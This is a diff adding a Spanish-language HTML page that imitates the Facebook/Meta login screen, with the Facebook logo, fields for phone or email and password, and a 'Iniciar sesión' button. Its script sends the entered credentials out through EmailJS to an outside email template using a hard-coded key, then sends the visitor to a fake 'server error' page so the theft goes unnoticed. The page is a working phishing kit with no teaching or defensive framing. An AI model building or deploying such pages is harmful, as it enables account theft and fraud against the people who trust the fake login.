@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>logins</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+<body>
+    <div class="language">Español</div>
+    <form id="form">
+        <div class="login-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
+            <input type="text" id="emailOrPhone" name="emailOrPhone" placeholder="Celular o correo electrónico">
+            <div class="password-container">
+                <input type="password" id="password" name="password" placeholder="Contraseña">
+                <span class="toggle-password" onclick="togglePassword()">
+                    <img src="https://cdn-icons-png.flaticon.com/512/565/565655.png" alt="Mostrar/Ocultar" id="toggle-icon">
+                </span>
+            </div>
+            <input type="submit" id="button" value="Iniciar sesión">
+            <a href="#">¿Olvidaste tu contraseña?</a>
+            <button type="button" class="create-account">Crear cuenta nueva</button>
+            <div class="meta-logo">
+                <span class="infinity">∞</span>
+                <span>Meta</span>
+            </div>
+            <div id="error-message" class="error-message" style="display:none;">
+                Error al iniciar sesión. Por favor, inténtelo de nuevo.
+            </div>
+        </div>
+    </form>
+    <div class="footer">
+        <a href="#">Información</a>
+        <a href="#">Ayuda</a>
+        <a href="#">Más</a>
+    </div>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  
+  <script type="text/javascript">
+    emailjs.init('zaaHXahGvlDnpshDt')
+  </script>
+    <script>
+        function togglePassword() {
+            var passwordField = document.getElementById('password');
+            var toggleIcon = document.getElementById('toggle-icon');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleIcon.src = 'https://cdn-icons-png.flaticon.com/512/159/159604.png'; // Icono sin la raya
+            } else {
+                passwordField.type = 'password';
+                toggleIcon.src = 'https://cdn-icons-png.flaticon.com/512/565/565655.png'; // Icono con la raya
+            }
+        }
+        
+
+        const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Iniciar sesion';
+
+   const serviceID = 'default_service';
+   const templateID = 'template_oim6m0i';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Iniciar sesion';
+      // Redirigir a otra página después de enviar el correo electrónico
+      window.location.href = 'Tenemos_incomvenientes_en_el_servidor_error_de_pagina,vuelva_a_intentarlo_mas_tarde:( ';
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+      // Redirigir a la página de error en caso de fallo
+      window.location.href = 'error.html';
+    });
+});
+
+
+    </script>
+</body>
+</html>
